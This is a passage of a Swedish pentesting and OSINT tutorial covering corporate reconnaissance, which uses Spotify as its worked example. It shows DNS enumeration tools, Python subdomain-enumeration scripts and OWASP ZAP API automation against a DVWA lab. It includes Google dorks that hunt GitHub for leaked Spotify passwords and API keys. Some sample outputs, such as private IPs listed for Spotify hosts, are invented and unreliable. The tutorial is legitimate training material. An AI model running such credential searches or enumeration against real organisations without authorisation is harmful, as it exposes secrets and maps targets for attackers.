# 🎓 Nivå 4: Avancerade Tekniker och Professionell OSINT/Pentesting

> **"The best preparation for tomorrow is doing your best today." - H. Jackson Brown Jr.**
>
> 📚 Läsningstid: 60-90 min | 🎯 Övningar: 7 + STORT PROJEKT | 💡 Svårighetsgrad: Avancerad

---

## 🗺️ Navigation
**[⬅️ Tillbaka till Nivå 3](OSINT_ZAP_Guide_Niva_3.md)** | **[🏠 Översikt](OSINT_ZAP_Guide_README.md)** | **[➡️ Nästa: Nivå 5](OSINT_ZAP_Guide_Niva_5.md)**

---

## 🎯 Vad du lär dig i denna nivå

Efter att ha läst Nivå 4 kommer du att:
- ✅ Genomföra professionell corporate OSINT och competitive intelligence
- ✅ Bemästra DNS enumeration med flera verktyg (dnsenum, dnsrecon, fierce)
- ✅ Automatisera ZAP med Python API - många praktiska exempel!
- ✅ Testa systematiskt för OWASP Top 10 sårbarheter
- ✅ Hitta och exploatera SQL Injection manuellt och med SQLmap
- ✅ Testa för CSRF, XXE, Command Injection
- ✅ Bypass WAF (Web Application Firewall)
- ✅ Skriva professionella penetrationstestningsrapporter
- ✅ Genomföra fullständig säkerhetsaudit av webbapplikation (PROJEKT!)

---

## 🏢 Del 1: Corporate OSINT och Competitive Intelligence

### 🎯 Vad är Corporate OSINT?

**Corporate OSINT** = Samla information om företag för:
- 💼 **Competitive Intelligence** - Förstå konkurrenter
- 🎯 **Reconnaissance** - Första fas i penetrationstestning
- 🛡️ **Defensive** - Förstå vad attackers kan hitta om DIG
- 💰 **Due Diligence** - Investeringsbeslut
- 🕵️ **Investigativ Journalism** - Avslöja korruption

### 🗺️ Corporate OSINT Framework

```
CORPORATE OSINT METODOLOGI
═══════════════════════════════════════════════════════════════

1. COMPANY INFORMATION
   ├─ Bolagsverket (Swedish Companies Registration Office)
   ├─ allabolag.se / ratsit.se
   ├─ Annual Reports (årsredovisningar)
   ├─ Press Releases
   └─ Social Media (LinkedIn, Twitter, Facebook)

2. DOMAIN & INFRASTRUCTURE
   ├─ WHOIS / Reverse WHOIS
   ├─ DNS Enumeration (subdomains, MX, TXT records)
   ├─ SSL Certificate Transparency
   ├─ Shodan / Censys (exposed assets)
   └─ ASN Lookup (Autonomous System Number)

3. PEOPLE
   ├─ LinkedIn (employees, org chart)
   ├─ Email Patterns (firstname.lastname@company.com)
   ├─ GitHub / GitLab (developers, leaked credentials)
   ├─ Twitter (company accounts, employees)
   └─ Conferences / Presentations (SlideShare, YouTube)

4. TECHNOLOGY STACK
   ├─ Job Postings (tech stack revealed!)
   ├─ BuiltWith / Wappalyzer
   ├─ GitHub Repos (company tech)
   ├─ Stack Overflow (developers asking questions)
   └─ Public APIs / Documentation

5. DATA LEAKS
   ├─ Have I Been Pwned (breached emails)
   ├─ Pastebin / GitHub (leaked credentials)
   ├─ Public S3 Buckets (misconfigured AWS)
   ├─ Google Dorking (exposed documents)
   └─ Wayback Machine (deleted sensitive info)
```

### 💼 Praktiskt Exempel: OSINT på Spotify

**Scenario:** Du ska göra OSINT på Spotify AB (med tillstånd eller för lärande)

**Steg 1: Company Information**

```bash
# Bolagsverket (manuellt via verksamt.se)
Företagsnamn: Spotify AB
Organisationsnummer: 556703-7485
Säte: Stockholm
VD: [Aktuell VD]
Styrelse: [Styrelseledamöter]

# allabolag.se
- Omsättning: X miljarder SEK
- Antal anställda: Y personer
- Kreditupplysning: AAA (exempel)
```

**Steg 2: DNS & Infrastructure**

```bash
# WHOIS
whois spotify.com

# Resultat:
Domain Name: SPOTIFY.COM
Registrar: MarkMonitor Inc.
Creation Date: 2006-04-23
Name Server: ns-1408.awsdns-48.org  ← AWS!
Name Server: ns-1897.awsdns-45.co.uk
Name Server: ns-421.awsdns-52.com
Name Server: ns-845.awsdns-41.net

# DNS Records
dig spotify.com ANY

# Resultat:
spotify.com.  300  IN  A  35.186.224.25
spotify.com.  300  IN  MX  10 spotify-com.mail.protection.outlook.com
spotify.com.  300  IN  TXT  "v=spf1 include:spf.protection.outlook.com ~all"
```

**Steg 3: Subdomain Enumeration (kommer i detalj senare)**

```bash
# theHarvester
theHarvester -d spotify.com -b dnsdumpster,crtsh

# Resultat (exempel):
api.spotify.com
developer.spotify.com
accounts.spotify.com
open.spotify.com
engineering.atspotify.com
```

**Steg 4: People - LinkedIn Mining**

```
Google Search:
site:linkedin.com "Spotify" "Security Engineer" "Stockholm"

Resultat:
- 50+ security engineers
- CISO: [Namn]
- Security Team: ~100 personer

Email Pattern Discovery:
firstname.lastname@spotify.com
f.lastname@spotify.com (sometimes)

Exempel:
john.doe@spotify.com
j.doe@spotify.com
```

**Steg 5: Technology Stack**

```bash
# Job Postings Analysis
site:linkedin.com/jobs "Spotify" "required skills"

Discovered Tech Stack:
──────────────────────────────────────────────
• Backend: Java, Python, Go
• Frontend: React, TypeScript
• Infrastructure: AWS, Kubernetes, Docker
• Databases: PostgreSQL, Cassandra, BigTable
• CI/CD: Jenkins, GitHub Actions
• Monitoring: Prometheus, Grafana
• Security: Vault, OAuth 2.0

# BuiltWith
https://builtwith.com/spotify.com

Detected:
- Cloudflare (CDN)
- Google Cloud Platform
- Fastly (CDN)
- AWS
```

**Steg 6: GitHub Intelligence**

```bash
# Search GitHub
site:github.com "spotify"

# Findings:
- Spotify's Official Repos: github.com/spotify
  * helios (Docker orchestration)
  * luigi (Python pipeline framework)
  * annoy (Approximate Nearest Neighbors)

# Search for leaked credentials (ETHICAL!)
site:github.com "spotify.com" password
site:github.com "spotify.com" api_key

⚠️ If you find leaks, report responsibly!
```

---

## 🌐 Del 2: DNS Enumeration - Djupdykning

DNS Enumeration är KRITISKT för att hitta attack surface.

### 🛠️ Verktyg för DNS Enumeration

#### 1. dnsenum

**Installation:**
```bash
# Kali Linux (förinstallerad)
dnsenum

# Ubuntu/Debian
sudo apt install dnsenum

# macOS
brew install dnsenum
```

**Användning:**
```bash
# Basic enumeration
dnsenum spotify.com

# Med ordlista för brute force
dnsenum --enum spotify.com -f /usr/share/wordlists/dnsmap.txt

# Spara resultat
dnsenum spotify.com -o spotify_dns.xml

# Output (exempel):
DNS Enumeration Results for spotify.com
─────────────────────────────────────────────────────────
Host                          Address
─────────────────────────────────────────────────────────
spotify.com                   35.186.224.25
www.spotify.com               35.186.224.47
api.spotify.com               35.186.224.89
accounts.spotify.com          104.199.65.124
developer.spotify.com         192.168.1.50
mail.spotify.com              52.97.216.162

MX Records:
───────────────────────────────────────────────────────
10 spotify-com.mail.protection.outlook.com

Name Servers:
───────────────────────────────────────────────────────
ns-1408.awsdns-48.org
ns-1897.awsdns-45.co.uk
ns-421.awsdns-52.com
ns-845.awsdns-41.net

Subdomains (brute forced):
───────────────────────────────────────────────────────
admin.spotify.com             [Timeout]
dev.spotify.com               192.168.100.15  ← Interesting!
staging.spotify.com           192.168.100.20  ← Interesting!
test.spotify.com              [No response]
```

#### 2. dnsrecon

```bash
# Installation
sudo apt install dnsrecon
pip install dnsrecon

# Standard enumeration
dnsrecon -d spotify.com

# Zone transfer attempt (often fails on modern DNS)
dnsrecon -d spotify.com -t axfr

# Brute force subdomains
dnsrecon -d spotify.com -t brt -D /usr/share/wordlists/subdomains.txt

# Google dorking for subdomains
dnsrecon -d spotify.com -t goo

# Output Format
dnsrecon -d spotify.com -x output.xml
```

**dnsrecon Python Script:**
```python
#!/usr/bin/env python3
"""
Custom DNS reconnaissance script
"""

import dns.resolver
import sys

def enumerate_dns(domain):
    """Enumerate DNS records for a domain"""

    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
    results = {}

    for record_type in record_types:
        try:
            answers = dns.resolver.resolve(domain, record_type)
            results[record_type] = []

            for rdata in answers:
                results[record_type].append(str(rdata))

            print(f"\n[+] {record_type} Records for {domain}:")
            for record in results[record_type]:
                print(f"    {record}")

        except dns.resolver.NoAnswer:
            print(f"\n[-] No {record_type} records found")
        except dns.resolver.NXDOMAIN:
            print(f"\n[!] Domain {domain} does not exist")
            return
        except Exception as e:
            print(f"\n[!] Error querying {record_type}: {e}")

    return results

def brute_force_subdomains(domain, wordlist_file):
    """Brute force subdomains using wordlist"""

    print(f"\n[*] Brute forcing subdomains for {domain}")
    found_subdomains = []

    try:
        with open(wordlist_file, 'r') as f:
            subdomains = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[!] Wordlist file {wordlist_file} not found")
        return []

    for subdomain in subdomains:
        fqdn = f"{subdomain}.{domain}"
        try:
            answers = dns.resolver.resolve(fqdn, 'A')
            for rdata in answers:
                print(f"[+] Found: {fqdn} -> {rdata}")
                found_subdomains.append((fqdn, str(rdata)))
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            pass  # Subdomain doesn't exist
        except Exception as e:
            pass  # Other errors (timeout, etc.)

    return found_subdomains

def reverse_dns_lookup(ip):
    """Perform reverse DNS lookup"""
    try:
        result = dns.resolver.resolve_address(ip)
        return str(result[0])
    except Exception as e:
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 dns_enum.py <domain> [wordlist]")
        sys.exit(1)

    domain = sys.argv[1]

    # Enumerate standard records
    print(f"[*] Starting DNS enumeration for {domain}")
    results = enumerate_dns(domain)

    # Brute force subdomains if wordlist provided
    if len(sys.argv) == 3:
        wordlist = sys.argv[2]
        subdomains = brute_force_subdomains(domain, wordlist)

        print(f"\n[+] Found {len(subdomains)} subdomains")

        # Try reverse DNS on found IPs
        print("\n[*] Attempting reverse DNS lookups...")
        for fqdn, ip in subdomains:
            reverse = reverse_dns_lookup(ip)
            if reverse:
                print(f"    {ip} -> {reverse}")
```

**Användning:**
```bash
python3 dns_enum.py spotify.com
python3 dns_enum.py spotify.com /usr/share/wordlists/subdomains.txt
```

#### 3. fierce

```bash
# Installation
sudo apt install fierce
pip install fierce

# Basic scan
fierce --domain spotify.com

# With custom DNS server
fierce --domain spotify.com --dns-servers 8.8.8.8

# Custom subdomain wordlist
fierce --domain spotify.com --subdomain-file subdomains.txt

# Output to file
fierce --domain spotify.com > fierce_output.txt
```

#### 4. Amass (Industry Standard!)

**Amass** är ett av de bästa verktygen för subdomain enumeration.

```bash
# Installation
sudo apt install amass

# Or via Go
go install -v github.com/OWASP/Amass/v3/...@master

# Basic passive scan (no direct DNS queries)
amass enum -passive -d spotify.com

# Active scan
amass enum -d spotify.com

# With all techniques
amass enum -active -d spotify.com -o amass_output.txt

# Visualize results (creates graph)
amass viz -d3 -d spotify.com
```

**Amass Output (exempel):**
```
api.spotify.com
accounts.spotify.com
developer.spotify.com
engineering.atspotify.com
labs.spotify.com
newsroom.spotify.com
partner.spotify.com
support.spotify.com
community.spotify.com
investors.spotify.com
ads.spotify.com
artists.spotify.com

[... 100+ more subdomains ...]

Total subdomains found: 247
```

### 🐍 Python Script: Complete Subdomain Enumeration

```python
#!/usr/bin/env python3
"""
Complete Subdomain Enumeration Toolkit
Combines multiple techniques for maximum coverage
"""

import subprocess
import dns.resolver
import requests
import json
from concurrent.futures import ThreadPoolExecutor
import argparse

class SubdomainEnumerator:
    def __init__(self, domain):
        self.domain = domain
        self.subdomains = set()

    def enumerate_crtsh(self):
        """Certificate Transparency logs via crt.sh"""
        print("[*] Querying crt.sh (Certificate Transparency)...")

        try:
            url = f"https://crt.sh/?q=%.{self.domain}&output=json"
            response = requests.get(url, timeout=30)

            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name = entry['name_value']
                    # Handle wildcard and newlines
                    names = name.split('\n')
                    for n in names:
                        n = n.strip().lstrip('*.')
                        if n.endswith(self.domain):
                            self.subdomains.add(n)

                print(f"    [+] Found {len(self.subdomains)} subdomains from crt.sh")

        except Exception as e:
            print(f"    [!] Error querying crt.sh: {e}")

    def enumerate_dns_dumpster(self):
        """Query DNSDumpster API"""
        print("[*] Querying DNSDumpster...")

        # DNSDumpster requires scraping or API key
        # This is a simplified example
        # In production, use: dnsdumpster or their API

        try:
            # Using theHarvester as alternative
            cmd = ['theHarvester', '-d', self.domain, '-b', 'dnsdumpster']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

            # Parse output (simplified)
            for line in result.stdout.split('\n'):
                if self.domain in line and ':' in line:
                    parts = line.split(':')
                    if len(parts) > 0:
                        subdomain = parts[0].strip()
                        if subdomain.endswith(self.domain):
                            self.subdomains.add(subdomain)

            print(f"    [+] DNSDumpster added subdomains")

        except Exception as e:
            print(f"    [!] Error with DNSDumpster: {e}")

    def brute_force_subdomains(self, wordlist_file):
        """Brute force using wordlist"""
        print(f"[*] Brute forcing with wordlist: {wordlist_file}")

        try:
            with open(wordlist_file, 'r') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"    [!] Wordlist not found: {wordlist_file}")
            return

        def check_subdomain(sub):
            fqdn = f"{sub}.{self.domain}"
            try:
                dns.resolver.resolve(fqdn, 'A')
                return fqdn
            except:
                return None

        # Use threading for speed
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(check_subdomain, wordlist)

        for result in results:
            if result:
                self.subdomains.add(result)
                print(f"    [+] {result}")

        print(f"    [+] Brute force complete")

    def resolve_all(self):
        """Resolve all subdomains to IPs"""
        print("\n[*] Resolving all subdomains to IP addresses...")

        resolved = {}

        for subdomain in sorted(self.subdomains):
            try:
                answers = dns.resolver.resolve(subdomain, 'A')
                ips = [str(rdata) for rdata in answers]
                resolved[subdomain] = ips
                print(f"    {subdomain} -> {', '.join(ips)}")
            except Exception as e:
                resolved[subdomain] = ['[No A record]']

        return resolved

    def check_http_status(self, subdomain):
        """Check if subdomain is accessible via HTTP/HTTPS"""
        for protocol in ['https', 'http']:
            try:
                url = f"{protocol}://{subdomain}"
                response = requests.get(url, timeout=5, allow_redirects=True)
                return f"{protocol}:// [{response.status_code}]"
            except:
                continue
        return "[Not accessible]"

    def generate_report(self, output_file):
        """Generate comprehensive report"""
        print(f"\n[*] Generating report: {output_file}")

        resolved = self.resolve_all()

        with open(output_file, 'w') as f:
            f.write(f"Subdomain Enumeration Report for {self.domain}\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Total Subdomains Found: {len(self.subdomains)}\n\n")

            for subdomain in sorted(resolved.keys()):
                ips = resolved[subdomain]
                http_status = self.check_http_status(subdomain)

                f.write(f"{subdomain}\n")
                f.write(f"  IPs: {', '.join(ips)}\n")
                f.write(f"  HTTP: {http_status}\n")
                f.write("\n")

        print(f"[+] Report saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description='Complete Subdomain Enumeration')
    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-w', '--wordlist', help='Wordlist for brute forcing')
    parser.add_argument('-o', '--output', default='subdomains_report.txt', help='Output file')

    args = parser.parse_args()

    enumerator = SubdomainEnumerator(args.domain)

    # Run all enumeration techniques
    enumerator.enumerate_crtsh()
    enumerator.enumerate_dns_dumpster()

    if args.wordlist:
        enumerator.brute_force_subdomains(args.wordlist)

    # Generate report
    enumerator.generate_report(args.output)

    print(f"\n[+] Enumeration complete!")
    print(f"[+] Found {len(enumerator.subdomains)} unique subdomains")

if __name__ == "__main__":
    main()
```

**Användning:**
```bash
# Basic enumeration
python3 subdomain_enum.py -d spotify.com

# With brute force
python3 subdomain_enum.py -d spotify.com -w /usr/share/wordlists/subdomains.txt

# Custom output
python3 subdomain_enum.py -d spotify.com -o spotify_subdomains.txt
```

---

## 🐍 Del 3: OWASP ZAP API - Python Automation (MÅNGA EXEMPEL!)

Nu kommer det roliga - automatisera ZAP med Python! Detta är AVGÖRANDE för professionell pentesting.

### 🎯 ZAP API Grunderna

#### Installation av ZAP Python Library

```bash
# Install python-owasp-zap-v2.4
pip install python-owasp-zap-v2.4

# Or latest version
pip install zaproxy
```

#### Starta ZAP i Daemon Mode (Headless)

```bash
# Start ZAP without GUI (headless mode)
zap.sh -daemon -port 8080 -config api.key=CHANGEME

# Windows
zap.bat -daemon -port 8080 -config api.key=CHANGEME

# Docker
docker run -u zap -p 8080:8080 -i owasp/zap2docker-stable zap.sh \
  -daemon -host 0.0.0.0 -port 8080 -config api.key=CHANGEME
```

### 🔧 Python Exempel 1: Basic ZAP Connection

```python
#!/usr/bin/env python3
"""
ZAP API Example 1: Basic Connection and Status
"""

from zapv2 import ZAPv2
import time

# ZAP Configuration
ZAP_HOST = 'localhost'
ZAP_PORT = 8080
ZAP_API_KEY = 'CHANGEME'  # Change to your API key!

# Initialize ZAP API client
zap = ZAPv2(
    apikey=ZAP_API_KEY,
    proxies={
        'http': f'http://{ZAP_HOST}:{ZAP_PORT}',
        'https': f'http://{ZAP_HOST}:{ZAP_PORT}'
    }
)

def test_connection():
    """Test ZAP API connection"""
    try:
        version = zap.core.version
        print(f"[+] Connected to ZAP!")
        print(f"    ZAP Version: {version}")
        return True
    except Exception as e:
        print(f"[!] Failed to connect to ZAP: {e}")
        return False

def get_zap_status():
    """Get ZAP status information"""
    print("\n[*] ZAP Status:")
    print(f"    Mode: {zap.core.mode}")
    print(f"    Version: {zap.core.version}")
    print(f"    Number of alerts: {len(zap.core.alerts())}")
    print(f"    Number of messages: {zap.core.number_of_messages()}")

def list_contexts():
    """List all contexts"""
    contexts = zap.context.context_list
    print(f"\n[*] Contexts: {len(contexts)}")
    for ctx in contexts:
        print(f"    - {ctx}")

if __name__ == "__main__":
    print("[*] ZAP API Basic Connection Test")

    if test_connection():
        get_zap_status()
        list_contexts()
    else:
        print("[!] Cannot proceed without ZAP connection")
```

### 🕷️ Python Exempel 2: Automated Spider

```python
#!/usr/bin/env python3
"""
ZAP API Example 2: Automated Spider
"""

from zapv2 import ZAPv2
import time

ZAP_API_KEY = 'CHANGEME'
zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})

def spider_target(target_url, max_depth=5):
    """Spider a target URL"""

    print(f"[*] Starting spider on {target_url}")
    print(f"    Max depth: {max_depth}")

    # Configure spider
    zap.spider.set_option_max_depth(max_depth)
    zap.spider.set_option_thread_count(5)

    # Start spider
    scan_id = zap.spider.scan(target_url)
    print(f"[+] Spider scan ID: {scan_id}")

    # Monitor progress
    while int(zap.spider.status(scan_id)) < 100:
        status = int(zap.spider.status(scan_id))
        print(f"    Spider progress: {status}%")
        time.sleep(2)

    print("[+] Spider completed!")

    # Get results
    results = zap.spider.results(scan_id)
    print(f"\n[+] URLs found: {len(results)}")

    # Print first 20 URLs
    for i, url in enumerate(results[:20], 1):
        print(f"    {i}. {url}")

    if len(results) > 20:
        print(f"    ... and {len(results) - 20} more")

    return results

def get_sites_tree():
    """Get sites tree structure"""
    sites = zap.core.sites

    print("\n[*] Sites Tree:")
    for site in sites:
        print(f"\n  {site}")
        urls = zap.core.urls(baseurl=site)
        print(f"    URLs in site: {len(urls)}")

        # Show first 10 URLs
        for url in urls[:10]:
            print(f"      - {url}")

if __name__ == "__main__":
    target = "http://localhost"  # DVWA or your test target

    # Spider the target
    urls = spider_target(target, max_depth=3)

    # Show sites tree
    get_sites_tree()
```

### 🎯 Python Exempel 3: Active Scan with Policy

```python
#!/usr/bin/env python3
"""
ZAP API Example 3: Active Scan with Custom Policy
"""

from zapv2 import ZAPv2
import time
import json

ZAP_API_KEY = 'CHANGEME'
zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})

def configure_scan_policy(policy_name="CustomPolicy"):
    """Create and configure custom scan policy"""

    print(f"[*] Creating scan policy: {policy_name}")

    # Create new policy (or use existing)
    try:
        zap.ascan.remove_scan_policy(policy_name)
    except:
        pass

    # Add policy
    zap.ascan.add_scan_policy(policy_name)

    # Configure policy - enable specific scanners
    # Scanner IDs:
    # 40012 = Cross Site Scripting (Reflected)
    # 40014 = Cross Site Scripting (Persistent)
    # 40018 = SQL Injection
    # 40019 = SQL Injection - MySQL
    # 40020 = SQL Injection - PostgreSQL
    # 90019 = Server Side Code Injection
    # 90020 = Remote OS Command Injection

    scanners_to_enable = {
        '40012': 'MEDIUM',  # XSS Reflected
        '40014': 'MEDIUM',  # XSS Stored
        '40018': 'HIGH',    # SQLi
        '40019': 'HIGH',    # SQLi MySQL
        '40020': 'HIGH',    # SQLi PostgreSQL
        '90019': 'MEDIUM',  # Code Injection
        '90020': 'HIGH',    # Command Injection
    }

    for scanner_id, threshold in scanners_to_enable.items():
        zap.ascan.set_scanner_alert_threshold(
            id=scanner_id,
            alertthreshold=threshold,
            scanpolicyname=policy_name
        )
        print(f"    [+] Enabled scanner {scanner_id} with threshold {threshold}")

    return policy_name

def active_scan(target_url, policy_name="CustomPolicy"):
    """Perform active scan with custom policy"""

    print(f"\n[*] Starting Active Scan on {target_url}")
    print(f"    Using policy: {policy_name}")

    # Start active scan
    scan_id = zap.ascan.scan(
        url=target_url,
        recurse=True,
        inscopeonly=False,
        scanpolicyname=policy_name
    )

    print(f"[+] Active scan ID: {scan_id}")

    # Monitor progress
    while int(zap.ascan.status(scan_id)) < 100:
        status = int(zap.ascan.status(scan_id))
        print(f"    Scan progress: {status}%")
        time.sleep(5)

    print("[+] Active scan completed!")

    return scan_id

def get_alerts(risk_level=None):
    """Get alerts from scan"""

    alerts = zap.core.alerts()

    if risk_level:
        alerts = [a for a in alerts if a['risk'] == risk_level]

    print(f"\n[*] Alerts Found: {len(alerts)}")

    # Group by risk
    risk_counts = {
        'High': 0,
        'Medium': 0,
        'Low': 0,
        'Informational': 0
    }

    for alert in alerts:
        risk = alert['risk']
        risk_counts[risk] = risk_counts.get(risk, 0) + 1

    print("\n[*] Risk Breakdown:")
    print(f"    🔴 High: {risk_counts.get('High', 0)}")
    print(f"    🟠 Medium: {risk_counts.get('Medium', 0)}")
    print(f"    🟡 Low: {risk_counts.get('Low', 0)}")
    print(f"    ℹ️  Info: {risk_counts.get('Informational', 0)}")

    return alerts

def print_alert_details(alert):
    """Print detailed alert information"""
    print(f"\n{'='*70}")
    print(f"Alert: {alert['alert']}")
    print(f"Risk: {alert['risk']} | Confidence: {alert['confidence']}")
    print(f"{'='*70}")
    print(f"URL: {alert['url']}")
    print(f"Parameter: {alert.get('param', 'N/A')}")
    print(f"\nDescription:")
    print(f"{alert['description']}")
    print(f"\nSolution:")
    print(f"{alert['solution']}")
    print(f"\nReference:")
    print(f"{alert.get('reference', 'N/A')}")

    if alert.get('attack'):
        print(f"\nAttack:")
        print(f"{alert['attack']}")

    if alert.get('evidence'):
        print(f"\nEvidence:")
        print(f"{alert['evidence']}")

if __name__ == "__main__":
    target = "http://localhost"  # Your test target

    # Configure custom policy
    policy = configure_scan_policy("MyCustomPolicy")

    # First, spider the target
    print("\n[*] Step 1: Spidering target...")
    spider_id = zap.spider.scan(target)
    while int(zap.spider.status(spider_id)) < 100:
        print(f"    Spider: {zap.spider.status(spider_id)}%")
        time.sleep(2)

    # Then, active scan
    print("\n[*] Step 2: Active scanning...")
    scan_id = active_scan(target, policy)

    # Get alerts
    alerts = get_alerts()

    # Print high-risk alerts
    high_risk = [a for a in alerts if a['risk'] == 'High']

    print(f"\n\n[!] HIGH RISK ALERTS ({len(high_risk)}):")
    for alert in high_risk:
        print_alert_details(alert)
```

### 📊 Python Exempel 4: Generate Reports

```python
#!/usr/bin/env python3
"""
ZAP API Example 4: Generate Reports
"""

from zapv2 import ZAPv2
import time
from datetime import datetime

ZAP_API_KEY = 'CHANGEME'
zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})

def generate_html_report(output_file="zap_report.html"):
    """Generate HTML report"""

    print(f"[*] Generating HTML report: {output_file}")

    # Get HTML report
    html_report = zap.core.htmlreport()

    # Save to file
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(html_report)

    print(f"[+] HTML report saved to {output_file}")

    return output_file

def generate_xml_report(output_file="zap_report.xml"):
    """Generate XML report"""

    print(f"[*] Generating XML report: {output_file}")

    xml_report = zap.core.xmlreport()

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(xml_report)

    print(f"[+] XML report saved to {output_file}")

    return output_file

def generate_json_report(output_file="zap_report.json"):
    """Generate JSON report with all alerts"""

    print(f"[*] Generating JSON report: {output_file}")

    import json

    alerts = zap.core.alerts()

    report = {
        'generated': datetime.now().isoformat(),
        'zap_version': zap.core.version,
        'total_alerts': len(alerts),
        'alerts': alerts
    }

    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2)

    print(f"[+] JSON report saved to {output_file}")

    return output_file

def generate_markdown_report(output_file="zap_report.md"):
    """Generate Markdown report (custom format)"""

    print(f"[*] Generating Markdown report: {output_file}")

    alerts = zap.core.alerts()

    # Group by risk
    by_risk = {
        'High': [],
        'Medium': [],
        'Low': [],
        'Informational': []
    }

    for alert in alerts:
        by_risk[alert['risk']].append(alert)

    # Generate markdown
    md = f"# ZAP Security Scan Report\n\n"
    md += f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    md += f"**ZAP Version:** {zap.core.version}\n\n"
    md += "---\n\n"

    md += "## Summary\n\n"
    md += f"- 🔴 **High Risk:** {len(by_risk['High'])}\n"
    md += f"- 🟠 **Medium Risk:** {len(by_risk['Medium'])}\n"
    md += f"- 🟡 **Low Risk:** {len(by_risk['Low'])}\n"
    md += f"- ℹ️  **Informational:** {len(by_risk['Informational'])}\n\n"

    md += "---\n\n"

    # Detail each risk level
    for risk in ['High', 'Medium', 'Low', 'Informational']:
        if by_risk[risk]:
            icon = {'High': '🔴', 'Medium': '🟠', 'Low': '🟡', 'Informational': 'ℹ️'}[risk]
            md += f"## {icon} {risk} Risk Alerts\n\n"

            for alert in by_risk[risk]:
                md += f"### {alert['alert']}\n\n"
                md += f"**Confidence:** {alert['confidence']}\n\n"
                md += f"**URL:** `{alert['url']}`\n\n"

                if alert.get('param'):
                    md += f"**Parameter:** `{alert['param']}`\n\n"

                md += f"**Description:**\n{alert['description']}\n\n"
                md += f"**Solution:**\n{alert['solution']}\n\n"

                if alert.get('reference'):
                    md += f"**References:**\n{alert['reference']}\n\n"

                md += "---\n\n"

    # Save
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(md)

    print(f"[+] Markdown report saved to {output_file}")

    return output_file

def generate_all_reports(base_name="zap_scan"):
    """Generate all report formats"""

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

    reports = {
        'html': generate_html_report(f"{base_name}_{timestamp}.html"),
        'xml': generate_xml_report(f"{base_name}_{timestamp}.xml"),
        'json': generate_json_report(f"{base_name}_{timestamp}.json"),
        'markdown': generate_markdown_report(f"{base_name}_{timestamp}.md")
    }

    print(f"\n[+] All reports generated:")
    for format_type, filepath in reports.items():
        print(f"    {format_type.upper()}: {filepath}")

    return reports

if __name__ == "__main__":
    # Generate all reports
    generate_all_reports("dvwa_scan")
```

### 🔍 Python Exempel 5: Context Management

```python
#!/usr/bin/env python3
"""
ZAP API Example 5: Context and Authentication
"""

from zapv2 import ZAPv2

ZAP_API_KEY = 'CHANGEME'
zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})

def create_context(context_name, target_url):
    """Create a new context"""

    print(f"[*] Creating context: {context_name}")

    # Create context
    context_id = zap.context.new_context(context_name)
    print(f"[+] Context ID: {context_id}")

    # Include URL in context
    zap.context.include_in_context(context_name, f"{target_url}.*")
    print(f"[+] Added {target_url}.* to context")

    return context_id

def configure_form_auth(context_name, login_url, username, password):
    """Configure form-based authentication"""

    print(f"[*] Configuring form-based authentication for {context_name}")

    # Set authentication method to form-based
    zap.authentication.set_authentication_method(
        contextid=context_name,
        authmethodname='formBasedAuthentication',
        authmethodconfigparams=f'loginUrl={login_url}&loginRequestData=username%3D%7B%25username%25%7D%26password%3D%7B%25password%25%7D%26Login%3DLogin'
    )

    print(f"[+] Authentication method set")

    # Set logged in/out indicators
    zap.authentication.set_logged_in_indicator(
        contextid=context_name,
        loggedinindicatorregex='\\QLogout\\E'
    )

    zap.authentication.set_logged_out_indicator(
        contextid=context_name,
        loggedoutindicatorregex='\\QLogin\\E'
    )

    print(f"[+] Login/Logout indicators set")

    # Create user
    user_id = zap.users.new_user(context_name, 'testuser')

    # Set credentials
    zap.users.set_authentication_credentials(
        contextid=context_name,
        userid=user_id,
        authcredentialsconfigparams=f'username={username}&password={password}'
    )

    zap.users.set_user_enabled(context_name, user_id, True)

    print(f"[+] User created and configured")

    return user_id

def test_authentication(context_name, user_id):
    """Test if authentication works"""

    print(f"[*] Testing authentication...")

    # Run authentication
    result = zap.authentication.authenticate(context_name, user_id)

    print(f"[+] Authentication result: {result}")

    return result

# Example usage for DVWA
if __name__ == "__main__":
    # DVWA settings
    target_url = "http://localhost"
    login_url = "http://localhost/login.php"
    username = "admin"
    password = "password"

    # Create context
    context_id = create_context("DVWA_Context", target_url)

    # Configure authentication
    user_id = configure_form_auth("DVWA_Context", login_url, username, password)

    # Test authentication
    test_authentication("DVWA_Context", user_id)

    print("\n[+] Now you can run authenticated scans!")
    print("    Use context 'DVWA_Context' in your scans")
```

### 🎨 Python Exempel 6: Custom Scanner Script

```python
#!/usr/bin/env python3
"""
ZAP API Example 6: Custom Vulnerability Scanner
"""

from zapv2 import ZAPv2
import time
import re

ZAP_API_KEY = 'CHANGEME'
zap = ZAPv2(apikey=ZAP_API_KEY, proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'})

class CustomVulnerabilityScanner:
    """Custom vulnerability scanner using ZAP API"""

    def __init__(self, target_url):
        self.target = target_url
        self.vulnerabilities = []

    def find_comments_in_source(self):
        """Find HTML comments that might leak information"""

        print("[*] Scanning for information disclosure in HTML comments...")

        messages = zap.core.messages(baseurl=self.target)

        comment_pattern = re.compile(r'<!--(.+?)-->', re.DOTALL)
